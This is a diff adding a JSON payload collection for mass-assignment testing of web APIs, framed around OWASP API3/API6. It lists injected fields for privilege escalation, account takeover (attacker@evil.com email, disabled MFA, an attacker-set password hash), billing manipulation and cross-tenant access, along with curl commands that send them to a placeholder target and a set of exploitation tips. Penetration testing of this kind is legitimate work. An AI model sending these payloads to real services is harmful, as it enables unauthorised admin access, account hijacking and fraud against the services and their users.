@@ -1,0 +1,103 @@
+{
+  "_description": "Mass Assignment / Excessive Data Exposure Payloads — OWASP API3/API6",
+  "_usage": "Add these fields to POST/PUT/PATCH requests. If the server accepts them without filtering, it's vulnerable.",
+
+  "privilege_escalation": {
+    "role": "admin",
+    "isAdmin": true,
+    "is_admin": true,
+    "admin": true,
+    "is_superuser": true,
+    "user_type": "admin",
+    "user_role": "administrator",
+    "permissions": ["admin", "read", "write", "delete", "manage"],
+    "access_level": 9999,
+    "privilege": "superadmin",
+    "group": "administrators",
+    "groups": ["admin", "staff", "superuser"],
+    "roles": ["ROLE_ADMIN", "ROLE_USER"],
+    "scope": "admin read write delete"
+  },
+
+  "account_takeover": {
+    "email": "attacker@evil.com",
+    "email_verified": true,
+    "emailVerified": true,
+    "verified": true,
+    "is_verified": true,
+    "password": "newpassword123",
+    "password_hash": "$2b$10$attacker_controlled_hash",
+    "two_factor_enabled": false,
+    "twoFactorEnabled": false,
+    "mfa_enabled": false,
+    "otp_secret": "",
+    "recovery_email": "attacker@evil.com",
+    "phone": "+1234567890",
+    "phone_verified": true
+  },
+
+  "billing_manipulation": {
+    "plan": "enterprise",
+    "subscription_tier": "premium",
+    "is_paid": true,
+    "credits": 999999,
+    "balance": 999999.99,
+    "trial_ends_at": "2099-12-31T23:59:59Z",
+    "subscription_status": "active",
+    "price": 0,
+    "discount": 100,
+    "coupon": "100OFF"
+  },
+
+  "status_manipulation": {
+    "status": "active",
+    "is_active": true,
+    "is_banned": false,
+    "is_locked": false,
+    "is_suspended": false,
+    "approved": true,
+    "is_approved": true,
+    "moderation_status": "approved",
+    "review_status": "published"
+  },
+
+  "metadata_injection": {
+    "id": 1,
+    "user_id": 1,
+    "created_at": "2020-01-01T00:00:00Z",
+    "updated_at": "2020-01-01T00:00:00Z",
+    "created_by": "admin",
+    "org_id": "OTHER_ORG_ID",
+    "tenant_id": "OTHER_TENANT",
+    "owner_id": 1
+  },
+
+  "feature_flags": {
+    "beta_features": true,
+    "feature_flags": {"admin_panel": true, "debug_mode": true},
+    "internal": true,
+    "debug": true,
+    "can_export": true,
+    "can_delete": true,
+    "can_manage_users": true,
+    "api_access": true,
+    "rate_limit": 999999
+  },
+
+  "curl_examples": {
+    "basic_registration": "curl -X POST https://api.target.com/api/v1/register -H 'Content-Type: application/json' -d '{\"email\":\"test@test.com\",\"password\":\"test123\",\"role\":\"admin\"}'",
+    "profile_update": "curl -X PUT https://api.target.com/api/v1/users/me -H 'Authorization: Bearer <TOKEN>' -H 'Content-Type: application/json' -d '{\"name\":\"Test\",\"is_admin\":true,\"role\":\"admin\"}'",
+    "graphql_mutation": "curl -X POST https://api.target.com/graphql -H 'Authorization: Bearer <TOKEN>' -H 'Content-Type: application/json' -d '{\"query\":\"mutation { updateUser(input: {name: \\\"Test\\\", role: \\\"admin\\\", isAdmin: true}) { id role } }\"}'",
+    "json_merge_patch": "curl -X PATCH https://api.target.com/api/v1/users/me -H 'Authorization: Bearer <TOKEN>' -H 'Content-Type: application/merge-patch+json' -d '{\"role\":\"admin\"}'"
+  },
+
+  "testing_tips": [
+    "1. Register a new account and check the full request/response in Burp",
+    "2. Note all fields returned in GET /users/me that aren't in the signup form",
+    "3. Add those hidden fields to the POST/PUT request",
+    "4. Compare response before/after — any accepted field = mass assignment",
+    "5. Try JSON arrays, nested objects, and __proto__ pollution",
+    "6. Check if API docs (Swagger/OpenAPI) expose internal fields",
+    "7. Test both JSON and form-encoded content types"
+  ]
+}
